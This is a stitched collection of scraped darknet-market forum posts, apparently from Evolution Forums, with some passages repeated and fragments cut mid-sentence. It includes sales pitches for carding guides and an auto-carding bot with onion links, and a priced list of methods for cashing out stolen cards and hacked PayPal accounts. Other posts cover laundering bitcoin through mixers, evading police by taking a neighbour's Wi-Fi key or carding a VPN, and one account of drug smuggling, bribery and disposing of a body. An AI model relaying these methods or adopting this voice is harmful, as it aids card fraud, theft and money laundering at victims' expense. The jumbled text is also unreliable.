lines of this: Copy the value identified as hex and paste it in the appropriate form on the âClaim Fundsâ page on evolution. After submitting, the transaction will also be signed by evolution and the funds will be transferred to the address you specified as your return/refund address.

I wrote it largely out of frustration that you can't sign multi-signature transactions in the Electrum client. especially given how useful a master public key is for deriving multiple multisig addresses for users.So, and I expect plenty of healthy suspicion from users about entering seeds, but there you go.

98af6ce3abafbfe4fac55cdde6a7482945038af0f3b4ca67e6fe9973fc08f697How it works:First prompt for the redeemScript. Decode, check that it's valid. If not, prompt again.Ask for a raw transaction to sign. Paste raw transaction here, it decodes, checks that it's valid. If the JSON inputs are pasted here, it'll prevent the next prompt from popping up.Ask for JSON inputs, or offer to download them from webbtc. If they were already supplied earlier, this is skipped.Ask for electrum seed (hex seed) or 12 word mnemonic. It'll generate the secret exponent, and master public key, then derive the first 30 public keys for the wallet. If any match keys in the redeemScript, the corresponding private key is generated and used in the wallet. It'll then ask if you think this is OK, or should it scan for more keys. Maybe you own all the keys, maybe just one. It'll stop if you reach the number of signatures required.Next is where the magic happens, it creates a wallet with private key/scripthash data, and builds up signatures wherever it can.It'll return complete = TRUE or FALSE. TRUE means it's signed fully, but false means it's not signed fully.Hopefully someone will find this as useful as I do."

I know almost everyone and how their platforms are performing and what fraud detection they may have in place.  Guess what? I'm going to teach you how to exploit them. Ever since I left I have been trying to find a way to make money from them, as a fraudster. Nothing is better than being a fraudster and having the knowledge of those who you're trying to fraud. For the past 4 months I have been working on a way to do this. I've found this way. What I've done is built a bot to automate the process and make the money practically come in automatically. Carding is involved with this method, however the bot automatically does this all by itself.  The best part is you are making a 1700% profit on each card. To sum it up, have you heard of JungleMoney? Moka's guide? Well it is about Stripe carding and his system is automatically setup to auto-card Stripe payments. My guide/method/bot is pretty much his guide, without Stripe and Stripe's stupid security features and with me having contacts with Stripe's Staff and knowing how their platform works in-and-out.  For $970 $1150 (3/5 copies sold, price changes on every sale) you will receive the following: Link: http://k5zq47j6wd3wdvjq.onion/listing/48233 * Complete Bot v0.5 will be coming out soon with more sophisticated features and the price for this will raise.

The best part is you are making a 1700% profit on each card.For $750 you will receive the following:- CompleteBot v0.25- Personal Help and Assistance 12/5- 15 High Quality cards to make your first $750.- Entire method and help connecting with my contacts (use a fake name!)- A guarantee of $1400 being made in your first week or else you will receive a full refund.Link: http://k5zq47j6wd3wdvjq.onion/listing/48233* Complete Bot v0.5 will be coming out soon with more sophisticated features and the price for this will raise."

I'm moving on to greener pastures and I don't see why I would leave this perfectly good method on the shelf when I can easily spread the wealth. I'm not going to tell you about Virwox. I've never seen a guide mentioning the method I'm disclosing before.  This method work as of 9/6/14 when it was tested by me personally. The earning potential on this particular method is only limited by the amount of time you are willing to invest, but that said they are both very easy methods to implement. Personally, I may have allegedly been able to pull $1000+ a day on near COMPLETE AUTO-PILOT to my bitcoin mixing service using the one included method alone. I am a new vendor so I am very much not trying to peddle you shit. You will get one .txt file with both methods. I am a native english speaker so you should not have any sort of problem understanding the guides. All that said, I can't say that this method are entirely noob friendly. This is not a ""teach you to card"" type of guide. This is for people that essentially know what they're doing, but are looking for some good new ideas. I am willing to provide a limited amount of support at my own discretion, but I wouldn't buy this expecting a lovely hand-holding kind of experience. There's real money here, and as I'm sure many of you have figured out.... The faster you get onto these sorts of things, the more you can make for longer. I'm not planning to limit sales or make periodic price changes, so buy now and hit it hard.  ______________ I hate to be a new vendor selling a .txt file with a ""$1000/day auto-pilot btc"" method... and I wouldn't be if I actually hadn't made that much with this. I get that the price may be a little steep for some, but as explained, this guide is not terribly friendly to those of the newbie-persuasion. This is not a how-to on carding (if you want one, Alpha's guide is pretty great). If you're even somewhat experienced in carding online shops. This will be a breeze for you. A very profitable breeze. This is not free money. You have to put in the work initially, but this is as close to an auto-pilot method you can find.  I'll do my best to answer general questions in this thread, but feel free to use the market pm system if you'd like an answer a little quicker. Trolls bore me, so there's probably better fun to be had somewhere else if that's what you're about.  As far as vouches go-- I'm happy to provide a few to users who actually have vouches that matter. If you have a low post count and/or this is my first time hearing of you, it's a no.  Thanks for reading!

This is an original method that I'd prefer didn't show up in a cheaper guide within a week, and for that reason I'm going to be pretty stingy with the free copies.  $75 isn't much for the target audience of this guide.

And I wouldn't do this if I had never earned that much this method in the past.

This is laid out in the guide, the principal difference is that without ATO you just have to start smaller. It becomes more of a numbers game, but because it's not the payment processing gateway that you'll run into trouble with, even if attempts fail, your cards will almost always still be fine for use elsewhere. I can't go into much more detail without compromising anything, but suffice to say that I made sure this is still viable for guys like me with too many cards and too little time to ATO. Though after going over the math with one of the vouch copy owners, taking the time to ATO if you have the skillset is absolutely worth doing. EDIT: While this was true at the time, it seems with more people trying to implement these methods, ATO is now necessary! Without it, I'm doubtful you'll make money, with it though, there's still great potential he for a lot of it.

Tell a single person you are expecting any sort of special package and, despite the other obvious risks of them telling more people who tell LE, that person could testify in court that YOU did INDEED place that order -- e.g. somebody isn't just framing you.

You must configure the site to use your processor or I may configure it for you for no extra charge.  Hosting can be topped up via BTC. Each site includes xPanel, FTP access, 200 email accounts. Monthly renewal is approximately 4-6 USD per month.  Please choose WordPress or landing page from the shipping options.  Turnaround time is 3-5 days.  I use high quality templates available on ThemeForest.  Each site has a footprint of approximately 50MB making scalability quick and effortless.  Such a small installation is well within the ""free usage"" block as described in the MonkeyBusiness appendix.   I offer limited post-sale support as my previous customers can tell you!   Thanks!

The total amount of copys beeing sold is 15, or 3 times the All in ONE Package **************************************************************************************** #1  US cc->BTC You will need to create an account to verify something, then you can buy btc. You have to prepare something that may takes between 2 days, then you can start buying almost instantly. No scans required.Either you register some accounts and prepare something on them and take noAVS cc or you need valid cvv to the fulz you have. Payout: Up to 1k in BTC at current market price per CC. Price fixed at 0.7  BTC, good price but good payout. **************************************************************************************** #2 CVV-> PP You will need to have verified pp account and some cvv cards.Set up requires about 20-30 minutes and then you will need some time charging some creditcards. The whole pricess takes about 1 week, can be done faster but is explained in the guide.  Payout: i'd say no real limit, but i recommend only 2k per PP.Funds are SemiClean. Price: 125$ **************************************************************************************** #3 CVV-> Bankdrop/PP You need an US bankdrop with ACH or an paypal account (verified recommended). You can also charge your creditcards and get a payout about 2 weeks from beginning, but everything is explained so the account doesnt burn within this time.Setup to start about 15 minutes + the time for charging cvv within the period of time. Payout: like #2, but also about 2k$ recommended Price: 110$ **************************************************************************************** #4 CVV-> US Bank drop You need an US bankdrop and some cvv, alternatively some PSD.Charge them yourself and get next day deposit.  Required:Fullz + creit report, limits depend on credit score, but 500$ at least. -Fast payout(next day deposits)-Genuine method that gives more information about many more if you dig a bit into. Price: 175$ **************************************************************************************** #5 cc->X->BTC You will get some decent resources where to buy and where to change and so on.Very easy method but not the biggest payout.A complete cashout takes about 30minutes to 1hour if everything runs smooth. Payout: depends on the resources you use, if you have the right one, no limit. Required:-CVV(sometime's novbv) or pp Price 75$ **************************************************************************************** #6 PP->BTC I will teach here how to get btc directly with paypal.For some providers described in here you will need scans, other not but depends on stock. Required:-hacked pp or middlman pp with funds Payout: Depends on your pp funds or how much you are able to pay with pp. Price: 150$ **************************************************************************************** #7 How to card virwox sucessfully for bigger amouts This method has been developed by me and you can get pretty big payouts from it.It's not the usual way and involves some preparations and investment but then you can have good amounts.Takes about 1 week in total but then you are able to get about 1k in BTC. Required:-investment (200-300$, you get back about 80% of this + the amount you are carding)-no vbv/skrill cc or hacked pp Payout:depends on your preparations and your cvv but recommended 1k per preparations Price 75$ **************************************************************************************** #8 Carding BTC with VBV cards Some resources and cashout's to get real big amounts of btc but only possible with right cards and right preparation.You get resources whrer to buy vbv cards, but only limited to little countrys. Required:-scans-VbV/Sc cards-sms receive Sometimes it takes some time for verification of scans but some is instant if you have good luck with it. Payout:-if you have the right cards and everything around 10k/day but i'd say thats not really possible because a lack of vendors for such cardsa nd resources Price: 75$ **************************************************************************************** #9 Scamming BTC You wil need to create a website and be able to share at maillists/fb like pages it to potential customers or you get them at other ways, everything described in the guide.

So they should be at least cardable with this method like 2-3 months if the fraud is THIS big. #2 These are pretty stable comÃ¼anys and i think they can deal really good with fraud and losses so they should stay alive for at least 2014, maybe they will change some of their verification habits but at all they will stay alive. #3 I think if you card them heavy they wont surrive 2 months, but in this time you can get very very good profits from them.","SierraRomeo wrote:ok so 'full package' is 12+3? how long do you predict, those 3 will work?"

There are other options in the altcoin space like Darkcoin although it also uses a variation of coinjoin called masternode coinjoin. This system is also flawed 80% or so of masternodes are hosted on amazon and open for centralized attack by the govt. The only open source project that enables users to remove coinbase link is the altcoin shadowcash. It works like zerocoin or zerocash by destroying the inputs and outputs of coins, issuing tokens (shadow) then mints fresh shadowcoins, essentially removing any history associated with the original coin all without requiring trust in the developers like the zero projects. There is no mixing involved because there is no need to mix or trust any service to mix coins.

The only project solving the coinbase linking issue to provide cash-like traceability so far has been shadow and it has gone unnoticed. A person could argue that bitcoin gives the same level of traceability as using an anonymous bank card. There is no name attached to either of them but the transactions are traceable and visible to anyone investigating the owner of the card or btc.

It seems like you are pushing it pretty hard. It is a good idea in theory, but not fully tested yet as stated in the links you provided. Also, I don't want to have to sell my bitcoins for shadow coins just to sell them back for more bitcoins in order to cash out/buy things. I could do that with any form of cryptocurrency like litecoin, dogecoin, etc.  Also, that coinjoinsudoku.com/advisory has to do with joining coin platforms like sharedcoin and coinjoin. Those have been disproved for a while now. But what you are actually saying is that ALL mixers are faulty except shadowcash. I'm in no way an expert, but it seems as long as individuals dont put 10 BTC into the mixer and instantly take 10 BTC out, then I believe it would be difficult to trace. Instead use multiple addresses going into the mixer, multiple addresses going out, random fees from the mixer and random withdraw times in order to establish anonymity. The problem with mixers is you have to trust that where you're sending the coins won't keep logs and won't take your money. Also you want to hope that many people are using it because the more people that use it, the more anonymity there is. Doesn't give you newly minted coins, just gives you coins that have never been to the darknet before. The way they say it though makes some people think that they are new coins but there is no way that can happen.","MartinLQueen wrote:There is no current way to break the bitcoin coinbase link by using mixers.

It is a good idea in theory, but not fully tested yet as stated in the links you provided. Also, I don't want to have to sell my bitcoins for shadow coins just to sell them back for more bitcoins in order to cash out/buy things. I could do that with any form of cryptocurrency like litecoin, dogecoin, etc. Also, that coinjoinsudoku.com/advisory has to do with joining coin platforms like sharedcoin and coinjoin. Those have been disproved for a while now. But what you are actually saying is that ALL mixers are faulty except shadowcash. I'm in no way an expert, but it seems as long as individuals dont put 10 BTC into the mixer and instantly take 10 BTC out, then I believe it would be difficult to trace. Instead use multiple addresses going into the mixer, multiple addresses going out, random fees from the mixer and random withdraw times in order to establish anonymity. The problem with mixers is you have to trust that where you're sending the coins won't keep logs and won't take your money. Also you want to hope that many people are using it because the more people that use it, the more anonymity there is.;horacekent wrote:there are only some 22 mil bitcoins and not even that amount has been mined, i dont think anyone have the processing power to mine 1000's of btc every day and if they do i think they would charge hell of lot more than 2-3%.im no genious when it come to sec/anonmity but its just common sense.;Avesis wrote:Doesn't give you newly minted coins, just gives you coins that have never been to the darknet before.

And even then once im done spending my btc and using the wallets if i erase all the data/wallets related to bitcoin and ive spent the btc already isnt the potential for discovering the identity of the owner of those bitcoins pretty much non existent at that point?I also thought that cashing out Bitcoins into USD anonymously was the hard part compared to spending anonymously?"

Use blockchain because then you aren't hosting the wallet so there's that scare out of the way. Apparently the nodes that the transaction originated from can sometimes but very rarely be traced if LE have the next node that the transaction reaches. I can't express how slim the chance is of ever being traced through the blockchain. It would require so much resources to do and unless your ISIS then they're not going to waste their time trying to do it. They also need a huge amount of luck to do it.",""

I watched it before my previous post too. To me shadowcash still doesn't seem like a viable option however. The reason has to do with liquidity. I believe the concepts are good and if everyone was using shadowcash then it could be great, same as zerocoin, but people are using bitcoin. For someone trying to move a few hundred or even a few thousand pounds, this isn't an issue. But for any of the large vendors who move 10-50k+ per month or the dude who stole $5 million from Bitstamp, trying to purchase that amount of shadowcoin and then resell back for bitcoin isn't a reasonable expectation. That is because of the lack of liquidity of those alt coins. I would even argue that it would still be difficult to move that amount even with a more popular coin like litecoin. So individuals like this will be using mixers and the steps I talked about earlier to help break the possibility of LE tracing the illicit bitcoins.  Now obviously most individuals aren't pulling in that kind of money. But for those people I would just suggest using local bitcoins to buy/sell and then using a mixer. This would limit any sort of association with criminal acts and the person committing them.","MartinLQueen wrote: i appreciate your response it seems you are well informed on the current state of bitcoin privacy solutions. i'm not associated, only a crypto anarchist spreading the good word about privacy advancement. think of me as cryptomoses, ""let my anons shop!"" lel. coingateway.net makes it so can use shadow anywhere bitcoin is accepted so its not a sunday chore as one would think. i wasn't meaning to be pushy about it only highlighting to the OP and everyone here that no bitcoin mixing technology can achieve cryptographic anonymity without severing the coinbase link.those are great tips for using mixers efficiently. the point i was making is the mixers peeps are using are built with the same coinjoin technology as sharedcoin. the primary flaw in the system is mixing inputs and outputs not remove the coinbase link. the technology doesn't permit it. the coins go through different mixing nodes to obfuscate the txid trail but what can be mixed with enough effort can be unmixed. the evidence in the sr trial claimed they traced upwards of 700,000 bitcoins over a duration. some of those coins went through mixers and some did not. coinjoin sudoku was made by one guy, it would make sense for a state level adversary to have more resources at their disposal to dedicate to unmixing txids. one can assume that the tools they used to unmix mixes are not publicly available. like the zeroproject protocols the shadowcash protocol doesn't rely on mixing, this slideshow does a great job of explaining the system for anyone interested http://www.slideshare.net/shadowcash/presentation3-43827434"

However, the discovery of just 2 pills in your posession doesn't sound like something LE would be persuing to charge you as an adult instead of a minor when the actual offence occurred. I could be wrong but that's my take on your situation.","kookoo72 wrote:Ok thanks for the advise i know i was extremely stupid and i will be staying away from all drugs for a long time.

"Evolution Forums","proximo","53623","2015-03-05T12:37:10","Re: caught by the cops and now being watched, advise???","Security & Anonymity","It's not so bad. If you wish to continue being on darkweb etc., make an excuse to visit your friendly neighbour(s), and get a few seconds to copy their wpa key ( you can probably use your phone to photograph it, but LE can backdoor android and iphones still if they have a good reason - i.e. they suspect you of dealing - use a standard digital camera and just keep the microsd up your butthole ). Don't use facebook or anything similar for anything but standard teenage stuff, like beer keg chucking and all that. Bring a dvd-r to your local library or a netcafe, download a livecd and burn it there. Hide it in your butt.  There are a few with tor and vpn stuff ( robolinux, libertÃ©, tails ) - I would recommend robolinux, but get a new vpn account, don't use your old one. It's on your mom's creditcard statement I'd wager. Card one or use bitcoin. The network applet in most of these types of cds ( dvds ) are pretty userfriendly, so get to it. Then get a nice linux shell account (google) and stash your files there ( crypted, ccrypt is very nice but gpg just seems to remain king: see the '-c' option, and vim is good for logs if you ':set cm=blowfish' ), just don't use the software on the servers for that, you can install ccrypt and whatever locally. The livecds just use a memory filesystem, and you can flush that by rebooting and doing a simple POST. After a wee while it's all gone.  Cheers. Edit: It's not uncommon for cops to build a case against a minor, and only let rip when he's 18+. Especially if you were selling drugs. Be careful, they're not nice uncles who want to give you candy. Hope this all makes sense to you.

If your machine is clean, then your safe, until the attack comes. To stay safe from cyber attacks, you need multiple layers of security. One of those layers should include patching. Don't limit patching to just your workstations. All your devices need to be patched. That includes, routers, switches, printers, phones, OSs, and software. All your systems should also be hardened. As a general rule, if a service or deamon can be disabled, it should be. Again, this includes routers, switches, printers, phones, OS, etc,   Funny that people spend so much energy on quadruple VPN + TOR + proxy on Ubuntu with VM but forget router is a Linksys WRT with firmware from 2003.

The conclusion I came to is Linux is very damn secure compared to everything else, Tails especially. The US government and most other countries use it on their backend. Stuff built into the kernel like AppArmor restricts capabilities of certain programs from crossing over without a good reason for it. https://en.wikipedia.org/wiki/AppArmor It's not perfect but it's out in the open (open source) and its being improved on everyday.

Hell, if a vendor is ok with it, use PGP for all conversations even basic ones. I have seen other users (on various marketplaces, including Evolution) mention they used services like Privnote, or other ""self-destructing private/anonymous"" services. These services are NOT a substitute for encryption. If you use one of these services in place of PGP, you might as well just send the message in plaintext to begin with. Regarding Evolution being a ""honeypot"" - don't be silly. If you feel as though it's unsafe, then there is one simple solution. Take your business elsewhere. Easy enough right?

That's strange because all it takes is 30 seconds to register an account on there and talk shit. Anyone can do it.  You know where I point my finger? Towards people that should be taking their anti-psychotic medication and shouldn't be getting powerful drugs from Evo, because let's face it.. from the right vendor, you can get some fucking powerful stuff. Stay away from the drugs! You've lit your very first REAL blunt up and it's actually got REAL weed in it and it's fucked you up man. You've taken a tab of REAL LSD in your mom's house and she's come back and it's sent you on a whirlwind of paranoia and delusion. Yes packages get seized. All it takes is for one package to be opened, and that's allowed by the way. Customs and package inspection at post offices and delivery centers ARE allowed to open packages and they don't always have to send confirmation after or when they do, it's a week after you've been arrested. It's all LEGAL. Maybe this person you have talked to, probably through Morse code because your a paranoid fuck (by the way, Morse code was cracked a millennia ago) was unlucky. And because it's cocaine, it's a HIGH VALUE asset for LE. Not like a few grams of cannabis, where now in most states, it's becoming legalized. Coke is LE's favorite. They snort that shit after they bust it wide open. I'm speculated here of course but they probably do.  It's down to the competence and sole discretion of both VENDOR and BUYER. If you've ordered a kilo of the finest cocaine and your vendor sends it in an open box with 'ARREST ME' written all over it then you are going down for a long time. But if your vendor is clever enough to think of covert methods of getting past these situations then you'll no doubt get your product. Quit blaming Evo. How is it Evo's fault that you only received 2/3 packages. Are the admins spying on your property? With their package scanning technology? Snooping in on your home when you make an order so they can personally pay you a visit and collect your drugs before they arrive? Get a grip. It's like listening to Vietnam veterans about how the world is out to get you and ""Oh, watch out for the landmines"" when you are walking through Wal-Mart. Jesus. Get off the drugs people.

"Evolution Forums","popadoppalus","35976","2014-12-05T07:05:15","Re: Evolution is possibly a honeypot!","Security & Anonymity","well this is absurd - i can tell you from over 40 years of living on the edge - as it were - that the statement that EVO is a honeypot is patently absurd. first off, it is entirely possible that people in positions as mods may well be hooked up with LE and they may be working for a get of jail free card (for future use), they may be ratting people out to resolve their own case, or the may just be screwed up in the head and get some kind of weird power trip by turning people into LE - a James Bond complex or whatever. but the idea that the whole site is a honeypot is ridiculous. i don't know how it happened, but somehow or another i get a lot of people on here that ask me by pm for security questions. while i do have an intensive background in security, i hardly claim to be an expert and i am sure there are many better people on EVO that never speak - which is probably wise as i speak too much, who have a much better understanding of security than i do.  but i can say that some of the heavy players on here have approached me with serious questions and i have even been put on retainer to analyze specific situations as they arise. Just yesterday i had a frantic request from a user who had his accounts hacked, using the same pw on all of them. he got a ransom demand and was very upset because they had very detailed info about his activities.  this was a little different from normal ransomware where a box is infected and the user is locked out, usually asking for a $300 moneypak to unlock the box. i recently had one that wanted $100 - obviously a script kiddie. i have a small consulting company and i have cleaned ransom ware off of at least 20 laptops, that were company owned and the guys didn't want to take them to their internal IT guys, for fear of getting written up for unauthorized use. some of the ransomware routines are more sophisticated than others, for example disabling regedit, and locking out the keyboard when the screen pops up, etc. these are relatively simple to remove, but this guy who frantically sought my advice yesterday was a bit different. these guys wanted 10 BTC and had detailed info about his activities, copies of his emails, etc. Plus the idiot had log files o his Jabber and other chats. i haven't heard from him today, but he was inclined to pay. i advised against this as they will merely ask for more and more later. i advised him that the best thing at this point would be to pull the HDD and replace it and just reinstall OS.   so anyway - let's look at this ridiculous claim as EVO as a honeypot. first off, i have heard but have no direct personal knowledge to back this up, that SR2 was brought down because one of the sysops registered the web hosting site attached to his own email address. obviously a rookie move. now other people involved in drug dealing, and fraud like carding or blowing off gift cards or whatever, have a ton of exposure vectors that can lead to their arrest. their clients (at least for drug dealers) are not model citizens, local LE is often involved, etc. . i know drug dealing, i used to be actively involved in it - not a lightweight either. for example, we once were moving a load of pot from Mexico into Arizona on a private twin engine DC3. one of our principals (partners) was on board the plane and after landing at he clandestine airstrip. he got out of the plane and walked into the prop. we had no choice except to bury him on site. i was involved in numerous deals with Black Panthers where they had heavy guns at every transaction. i paid off the Boston cops on numerous occasions, so i am no rookie when it comes to the murky world of international dug smuggling. i saw my share of too many things to even mention here. on one occasion we had a guy who od-ed on toot and died in our living room. we had no idea who he was (time were different in the 60's), but we had to transport the body and drop it behind a dumpster in Kenmore Square, which was much simpler than calling the cops.  but calling EVO a honey pot is absurd. i saw a post today about some guy selling pipe bombs. seems absurd to me because any body can get instructions on building a pipe bomb on clearnet. but the point is if EVO were a honeypot such posters not to mention big time coke and heroin dealers would be high priority targets and the LE priority would probably demand their immediate removal. however, it is possible that such activity is allowed to continue in hopes of a better, more comprehensive take down. cops accidentally find loads of drugs by accident and report to news media that it was work of months of undercover investigation. this gets them more money in their budget. but what i want to discuss here is the actual situation on Evo. i don't know Verto, but have had conversations via PM with hm. some people say Kimble is Verto. that is nonsense - i won't even explain why, but it should be obvious. i have had 2 mods come to me for security advice on their opsec. so obviously the access chain is not one where a mod can just ask Verto a question about security. instead it implies to me that there are layers of insulation that prevent mods from even knowing each other in reality. it's the only reasonable explanation i can infer. so with that being said what about the data that mods have access to. my personal opinion, derived from other BBS type of setups, is that they have a scale of permissions which probably allow them to access PM data and to other files, as well as probably the ability to monitor (VNC type of monitoring, where they can follow a user around the forums). now i doubt that Verto has the forums located on the same server (as DPR did on SR), but their access may allow them to continue to tail a user, say from the forum into the market. now lets look at PGP encryption. i use, as do many others like Bruce Scheier (sp?) an air gapped box to handle all of that type of activity - primarily to avoid any one looking over my shoulder. okay say then that the guy comes backwith his PGP encrypted message and orders an ounce of toot - enough to draw serious time. well the vendor gets the PGP msg and decrypts it right there on TOR and in plain sight of any mod who happens to be spying. this is a much more likely scenario. from there it is entirely possible that whoever is a rat spying will turn over the data to whoever. in my experience probably 90% of all drug busts are the result of a snitch. but that's long stretch to saying EVO is a honeypot.   let's talk about honeypots for a minute. for any newbs that don't know what they are, a honeypot is a box that is purposely set up for easy access/hack whatever. i think it is pretty well established fact that the FBI has used honeypots to lure pedophiles and then turn the intel over to local pd to make the bust (so they don't blow the cover of the honey pot). there are also private honeypots - if i remember correctly that was how Kevin Mitnick was taken down. the owner of a hacked site set up a honeypot that allowed him to trace the IP back to NC, where they moved in and used triangulation to nail him. there may well be LE honeypots on the DW (and clearweb too for that matter) shit, W Bush answer to war on terror (besides WMD bullshit) was to bust Tommy Chong for selling bongs on the internet. he did 9 months. but the idea of EVO being a honey pot is absurd on the face of it. Verto may be working both sides of the street for all i know, but i have no reason to believe that. i still never let that possibility escape me. you can't really know anything for sure, until it happens to you, and even then you may have the wrong person pegged as the rat.    obviously what you are doing on the web has a direct bearing on your security. LE has a number of suspected or known TOR relays that they maintain. exclude them in your torrc config file. use encryption on your PMS, this keeps prying eyes of mods from being too nosy. obviously the challenges of hosting a site are different than those of an individual user. NEVER EVER open a downloaded file, while in TOR - download to a USB stick and use sneakerware to carry it to an airgapped machine and decrypt and recrypt, etc. as a vendor you have to destroy this data after the order is complete. any breach along that chain opens the door to LE. the unreliability of many people involved (plus i was getting too old) in the drug trade led to me to give it up. it got to much for me when my partner was buying white crosses in hundred pound lots - there was no way to count them and you had to wear masks, etc. to handle the packaging. i recall once we were doing a 200 lb pot deal in Providence, where the guy paid his employees with pot. it was an autobody shop. these guys were mobbed up, but just on the edge as associates. anyway we had 20 pounds on the scale and into the office walked a Police Captain in full uniform. his car was being worked on. our host escorted him out and later said he slipped him 5 c-notes to forget what he had seen (and fixed his car for nothing). if you are into drugs you can't trust anyone.   but for the most part honeypots are a myth, crawling spiders would find them and identify them as such. after the recent raid some Polish guy crawled the whole dark web and reported 9000 TOR sites, of which the police took down 400 and 273 or so were identified as bogus or overtly malicious. i think EVO is good for a good while, yet. but like i said - it is usually a rat inside that causes the downfall. i still have coins in there.  just stay safe and realize there are different models of opsec for site admins, users and vendors and while they may overlap there are discrete differences in how each implements itself.  popa - with paragraphs after much pressure.",""

not a lightweight either. for example, we once were moving a load of pot from Mexico into Arizona on a private twin engine DC3. one of our principals (partners) was on board the plane and after landing at he clandestine airstrip. he got out of the plane and walked into the prop. we had no choice except to bury him on site. i was involved in numerous deals with Black Panthers where they had heavy guns at every transaction. i paid off the Boston cops on numerous occasions, so i am no rookie when it comes to the murky world of international dug smuggling. i saw my share of too many things to even mention here. on one occasion we had a guy who od-ed on toot and died in our living room. we had no idea who he was (time were different in the 60's), but we had to transport the body and drop it behind a dumpster in Kenmore Square, which was much simpler than calling the cops.  but calling EVO a honey pot is absurd. i saw a post today about some guy selling pipe bombs. seems absurd to me because any body can get instructions on building a pipe bomb on clearnet. but the point is if EVO were a honeypot such posters not to mention big time coke and heroin dealers would be high priority targets and the LE priority would probably demand their immediate removal. however, it is possible that such activity is allowed to continue in hopes of a better, more comprehensive take down. cops accidentally find loads of drugs by accident and report to news media that it was work of months of undercover investigation. this gets them more money in their budget. but what i want to discuss here is the actual situation on Evo. i don't know Verto, but have had conversations via PM with hm. some people say Kimble is Verto. that is nonsense - i won't even explain why, but it should be obvious. i have had 2 mods come to me for security advice on their opsec. so obviously the access chain is not one where a mod can just ask Verto a question about security. instead it implies to me that there are layers of insulation that prevent mods from even knowing each other in reality. it's the only reasonable explanation i can infer. so with that being said what about the data that mods have access to. my personal opinion, derived from other BBS type of setups, is that they have a scale of permissions which probably allow them to access PM data and to other files, as well as probably the ability to monitor (VNC type of monitoring, where they can follow a user around the forums). now i doubt that Verto has the forums located on the same server (as DPR did on SR), but their access may allow them to continue to tail a user, say from the forum into the market. now lets look at PGP encryption. i use, as do many others like Bruce Scheier (sp?) an air gapped box to handle all of that type of activity - primarily to avoid any one looking over my shoulder. okay say then that the guy comes backwith his PGP encrypted message and orders an ounce of toot - enough to draw serious time. well the vendor gets the PGP msg and decrypts it right there on TOR and in plain sight of any mod who happens to be spying. this is a much more likely scenario. from there it is entirely possible that whoever is a rat spying will turn over the data to whoever. in my experience probably 90% of all drug busts are the result of a snitch. but that's long stretch to saying EVO is a honeypot.   let's talk about honeypots for a minute. for any newbs that don't know what they are, a honeypot is a box that is purposely set up for easy access/hack whatever. i think it is pretty well established fact that the FBI has used honeypots to lure pedophiles and then turn the intel over to local pd to make the bust (so they don't blow the cover of the honey pot). there are also private honeypots - if i remember correctly that was how Kevin Mitnick was taken down. the owner of a hacked site set up a honeypot that allowed him to trace the IP back to NC, where they moved in and used triangulation to nail him. there may well be LE honeypots on the DW (and clearweb too for that matter) shit, W Bush answer to war on terror (besides WMD bullshit) was to bust Tommy Chong for selling bongs on the internet. he did 9 months. but the idea of EVO being a honey pot is absurd on the face of it. Verto may be working both sides of the street for all i know, but i have no reason to believe that. i still never let that possibility escape me. you can't really know anything for sure, until it happens to you, and even then you may have the wrong person pegged as the rat.    obviously what you are doing on the web has a direct bearing on your security. LE has a number of suspected or known TOR relays that they maintain. exclude them in your torrc config file. use encryption on your PMS, this keeps prying eyes of mods from being too nosy. obviously the challenges of hosting a site are different than those of an individual user. NEVER EVER open a downloaded file, while in TOR - download to a USB stick and use sneakerware to carry it to an airgapped machine and decrypt and recrypt, etc. as a vendor you have to destroy this data after the order is complete. any breach along that chain opens the door to LE. the unreliability of many people involved (plus i was getting too old) in the drug trade led to me to give it up. it got to much for me when my partner was buying white crosses in hundred pound lots - there was no way to count them and you had to wear masks, etc. to handle the packaging. i recall once we were doing a 200 lb pot deal in Providence, where the guy paid his employees with pot. it was an autobody shop. these guys were mobbed up, but just on the edge as associates. anyway we had 20 pounds on the scale and into the office walked a Police Captain in full uniform. his car was being worked on. our host escorted him out and later said he slipped him 5 c-notes to forget what he had seen (and fixed his car for nothing). if you are into drugs you can't trust anyone.   but for the most part honeypots are a myth, crawling spiders would find them and identify them as such. after the recent raid some Polish guy crawled the whole dark web and reported 9000 TOR sites, of which the police took down 400 and 273 or so were identified as bogus or overtly malicious. i think EVO is good for a good while, yet. but like i said - it is usually a rat inside that causes the downfall. i still have coins in there.  just stay safe and realize there are different models of opsec for site admins, users and vendors and while they may overlap there are discrete differences in how each implements itself.  popa - with paragraphs after much pressure."

They are going for the big vendors, those that have accrued thousands and thousands of sales and have plenty of product. But it's pretty hard to get to them when the whole point of DNM's maintains the anonymity of the vendor. Like popadoppalus says, the only real way LE can get in is through the backdoor. Effectively becoming a physical trojan in the marketplace where they can get to work on revealing vendors. Don't get me wrong, if there are people on here buying tens of thousands of dollars of drugs then maybe they too are targets. But it's either the DNM that gets hit or the vendors or usually both. A good way that LE could start busting vendors could be through malware. I've seen a few vendors on here claiming they purchased guides and the guides contained malware. It's not a good idea to download anything and if you are, use a burner laptop or just a cheap computer you could get for $100-150. Copy the 'guide' onto the system, don't connect to the internet so the malware can't find it's handler and run a resource monitor and see what it's trying to do. If a guide is sending out data then you've got a fucking problem. What .pdf document requires an internet connection? As for encryption, it's a 50/50 gamble. There are sources saying that PGP has been cracked a long time ago, and there are sources saying that some of the most strongest encryption standards are set to be cracked by 2020. And that includes RSA and AES-256 which is actually from what I read a statement by the NSA. And I wouldn't put it past them, their workforce has grown tenfold over the past 5 years and they have quickly getting a tighter grasp over the internet to a point now where pretty much every country in the world is within reach of the NSA in terms of data.",""

By doing this, you are going to identify the VPN you are routing through, which will give LE a means to find you.  It is ISP->VPN->TOR -- unless you provide compelling evidence. I am strongly suspect of anyone advising going ISP->TOR-> VPN instead, as it makes them more vulnerable simply because they are going directly from their ISP to TOR (even though TOR should be secure, it's been questioned lately, obviously).

Connecting to a VPN first and then connecting to Tor means for all intents and purposes, you're relying on the VPN provider to not keep logs which would contain your real IP address. Yes, some people will claim that certain VPN providers don't keep logs and that if a VPN provider received a Court Order requesting they hand over their logs to LE, they wouldn't be able to as there would be none to hand over. However, I for one would never put my fate in the hands of a VPN provider regardless of whether they keep logs or not. Only the owners / staff would know for sure and when push comes to shuv and LE are putting the pressure on you to hand over any logs you may have, who knows what may happen. It's happened before!There are other ways to hide / mask your connection to Tor without the use of a VPN. A few examples are things like using hacked wi-fi, using random, carefully chosen public wi-fi hotspots or setting up your own secure entry guard to connect to the Tor network, preventing you from inadvertantly connecting to a malicious entry node.","unicorned wrote:The Grugq hosted a talk at the HackintheBox 2012 conference.

